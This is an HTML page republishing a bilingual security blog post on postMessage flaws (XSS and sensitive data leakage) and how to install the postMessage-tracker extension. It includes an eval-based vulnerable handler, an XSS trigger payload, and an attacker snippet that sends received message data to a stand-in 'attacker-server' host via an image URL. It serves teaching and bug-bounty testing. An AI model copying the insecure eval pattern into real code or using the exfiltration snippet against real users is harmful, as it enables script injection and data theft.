@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vulnerability of postMessage and postMesasge-tracker browser extension — PIXN</title>
+  <meta name="description" content="Vulnerability of postMessage and postMesasge-tracker browser extension — Web security, testing methods, secure development, and defensive concepts.">
+  <meta property="og:title" content="Vulnerability of postMessage and postMesasge-tracker browser extension — PIXN"><meta property="og:description" content="Vulnerability of postMessage and postMesasge-tracker browser extension — Web security, testing methods, secure development, and defensive concepts."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="learn"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/learn/">Learn</a> / <a href="/learn/security/">Security Learning</a></p>
+      <h1>Vulnerability of postMessage and postMesasge-tracker browser extension</h1>
+      <time datetime="2020-05-14">MAY 14, 2020</time>
+    </header>
+    <article class="article-body"><p>Hi hackers and bugbounty hunter!</p>
+<p>Recently, <a href="https://twitter.com/fransrosen">@frans</a> released a browser extension called postMessage-tracker and I found it. So today I'm wrting about the expansion and postMessage. frans announced the analysis of postMessage under the title <a href="https://youtu.be/oJCCOnF25JU?t=1100">Attacking Modern Web Technologies</a>) in 2018 AppSec, and this extension release this month.</p>
+<p><em>frans가 2018 AppSec 에서 <a href="https://youtu.be/oJCCOnF25JU?t=1100">Attacking modern web technologies</a> 란 타이틀로 postMessage에 대한 분석에 대한 이야기를 발표했었는데요, 이 때 소개한 Browser Extension이 이번달 릴리즈되어 관련 내용 가볍게 공유할까 합니다.</em></p>
+<h2 id="what-is-postmessage">What is postMessage</h2>
+<blockquote>
+<p>The <code>window.postMessage()</code> method safely enables cross-origin communication between <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window"><code>Window</code></a> objects; between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.</p>
+</blockquote>
+<p><em><a href="https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage">MDN에서 postMessage</a>를 보세요.</em></p>
+<h2 id="analysis-vulnerability-of-postmessage">Analysis Vulnerability of postMessage</h2>
+<p>I wrote about the vulnerability of postMessage in 2016. Unfortunately, I only wrote in Korean at that time. It's about XSS and Sensitive data leak, and if you're curious, please use the translator!</p>
+<p><em>관련해선 예전에 정리해둔글이 있으니 한번 참고해주세요.</em></p>
+<ul>
+<li>https://www.hahwul.com/2016/08/web-hacking-html5-postmessage-api.html</li>
+</ul>
+<p>요약하면</p>
+<ul>
+<li>XSS</li>
+<li>Sensitive Data Leakage</li>
+<li>Etc</li>
+</ul>
+<h3 id="xss">XSS</h3>
+<p>It's mainly shown in the AppSec video above, and as I mentioned in my previous article, XSS is the best and most influential. This code is probably weak. The code below is the code that passes the data received by b.data.evalCall to the factor value of the eval, where postMessage can be used to trigger XSS by passing the attack phrase like the second code on the page you call.</p>
+<p><em>위에 AppSec 영상에서도 주로 나오고, 관련 사례에서도 확인되듯이 XSS가 가장 잘 나오고, 영향도도 높습니다. 대략 이런 코드가 취약하겠네요. 아래 코드는 b.data.evalCall으로 받은 데이터를 eval의 인자값으로 넘기는 코드인데, 이 때 postMessage를 사용한다면 호출하는 페이지에서 두번째 코드와 같이 공격구문을 전달하여 XSS를 트리거시킬 수 있습니다.</em></p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> <span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>
+   b<span class="hljs-punctuation">.</span>data<span class="hljs-punctuation">.</span>evalCall<span class="hljs-operator">&amp;&amp;</span><span class="hljs-built_in">eval</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;(&quot;</span><span class="hljs-operator">+</span>b<span class="hljs-punctuation">.</span>data<span class="hljs-punctuation">.</span>evalCall<span class="hljs-operator">+</span><span class="hljs-string">&quot;)&quot;</span><span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">}</span>
+
+b<span class="hljs-punctuation">.</span>postMessage<span class="hljs-punctuation">(</span><span class="hljs-punctuation">{</span><span class="hljs-string">&quot;evalCall&quot;</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;alert(document.domain)&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>This is possible if the postMessage call section is weak or the CORS setting on the receiving side is weak. As you can see from the MDN document, postMessage follows SOP.</p>
+<p><em>postMessage를 호출하는 구간이 취약하거나 받아주는 쪽의 CORS 설정이 취약한 경우 가능한데요. MDN 문서를 보시면 아시겠지만 postMessage는 SOP를 따릅니다.</em></p>
+<ul>
+<li>https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage</li>
+</ul>
+<p>Below is a related case, so please refer to</p>
+<p><em>아래는 관련 사례이니 참고해주세요.</em></p>
+<p><a href="https://hackerone.com/reports/398054">https://hackerone.com/reports/398054</a>
+<a href="https://www.hahwul.com/2019/02/postmessage-xss-on-hackerone-by-adac95-review.html">https://www.hahwul.com/2019/02/postmessage-xss-on-hackerone-by-adac95-review.html</a></p>
+<h3 id="sensitive-data-leakage">Sensitive data leakage</h3>
+<p>With postMessage, you can also steal sensitive data. Like JSON Hijack or several data deodorization techniques, postMessage requires verification of the requested window (Parent) when sending data. If an attacker calls a vulnerable page into Child on their site and asks for the ability to collect information through postMessage, it's easy to get your information.</p>
+<p><em>취약 페이지가 중요정보를 postMessage를 통해 전송하고 SOP가 우회된 경우 공격자가 피해자 세션의 중요 데이터를 postMessage를 통해 받아올 수 있습니다.</em></p>
+<p>vuln page</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> parent_getUserInfo<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">{</span>
+   <span class="hljs-keyword">var</span> userdata<span class="hljs-operator">=</span><span class="hljs-punctuation">[</span>name<span class="hljs-punctuation">,</span>age<span class="hljs-punctuation">,</span> 등등<span class="hljs-punctuation">...</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">;</span>
+   parent<span class="hljs-punctuation">.</span>postMessage<span class="hljs-punctuation">(</span>userdata<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+
+</code></pre>
+<p>attacker</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">img</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;http://attacker-server/?&quot;</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">message</span><span class="hljs-punctuation">&gt;</span>  <span class="hljs-comment">&lt;!--</span><span class="hljs-comment"> 공격자 페이지 </span><span class="hljs-comment">--&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+ <span class="hljs-built_in">window</span><span class="hljs-punctuation">.</span>onmessage <span class="hljs-operator">=</span> <span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span>e<span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>    <span class="hljs-comment">// data를 읽어와서
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;message&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>src <span class="hljs-operator">+=</span> <span class="hljs-string">&quot;&amp;&quot;</span><span class="hljs-operator">+</span>e<span class="hljs-punctuation">.</span>data<span class="hljs-punctuation">;</span> <span class="hljs-comment">//
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+
+</code></pre>
+<p>It's usually caused by a chain attack when there's a lack of verification of the parent page in a child page, or if there's a vulnerability in it.</p>
+<p><em>보통은 child page에서 parent 페이지에 대해 검증이 부족하거나 검증된 parent 페이지에 XSS등의 취약점이 있는 경우 연쇄작용으로 발생하겠네요.</em></p>
+<h2 id="how-to-use-postmessage-tracker">How to use postMessage-tracker?</h2>
+<blockquote>
+<p>https://github.com/fransr/postMessage-tracker</p>
+</blockquote>
+<h3 id="installation">Installation</h3>
+<ol>
+<li>Clone repo</li>
+</ol>
+<pre><code>git clone https://github.com/fransr/postMessage-tracker
+</code></pre>
+<ol start="2">
+<li>Add extension to chrome</li>
+</ol>
+<blockquote>
+<p><code>Chrome(firefox)</code> =&gt; <code>Setting</code> =&gt; <code>Extension</code> =&gt; <code>Load from file or dir</code></p>
+</blockquote>
+<p>Although the description says it was made for Chrome, it is actually available on the cross platform because the Chromium engine-based browser as well as the firebox use the same JavaScript extension.</p>
+<p>When you access the page where postMessage is inserted with the extension installed, the extension shows the relevant code. You can look at this, see if it leads to XSS or other vulnerabilities, and then switch to vulnerabilities.</p>
+<p><em>이후 Chrome(firefox) =&gt; Setting =&gt; Extension =&gt; Load from file or dir 순서로 진입하셔서 확장 기능을 로드해주시면 됩니다. 브라우저별로 상이하니 이 부분은 사용하시는 브라우저에 따라서 찾아보시면 될 것 같습니다.</em></p>
+<p><em>설명으론 크롬용으로 만들었다곤 하지만, 실제로 크로미움 엔진 기반 브라우저는 물론 firefox도 동일하게 자바스크립트 확장기능을 사용하기 때문에 크로스 플랫폼에서 사용이 가능합니다.
+확장 기능이 설치된 상태에서 postMessage가 삽입된 페이지에 접근하게 되면 관련 코드를 확장기능에서 보여줍니다. 이걸보고, XSS나 다른 취약점으로 연결될지 분석하고 취약점으로 바꿔먹으면 됩니다.</em></p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-FgusfIaKL-k/Xr11i2CMELI/AAAAAAAAFMg/BFYO_h8Se5UgYg9PTHc2wplmLNT1u1vRQCLcBGAsYHQ/s1600/1415.png" alt="" /></p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-iRhCCVDoEVg/Xr11jBtE7OI/AAAAAAAAFMk/C30doQHxJ603xMr_zPZVnv4WkeTWhfA_wCLcBGAsYHQ/s1600/1416.png" alt="" /></p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-X7D-mGXJeys/Xr11i5e-xrI/AAAAAAAAFMo/Xj585hKLbkAM4xse3yYsLBxWSXBIylEqACLcBGAsYHQ/s1600/1417.png" alt="" /></p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>https://github.com/fransr/postMessage-tracker</li>
+<li>https://www.youtube.com/watch?v=oJCCOnF25JU</li>
+<li>https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage</li>
+<li>https://www.hahwul.com/2016/08/web-hacking-html5-postmessage-api.html</li>
+<li>https://www.hahwul.com/2019/02/postmessage-xss-on-hackerone-by-adac95-review.html</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/blog/2020/vulnerability-of-postmessage/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
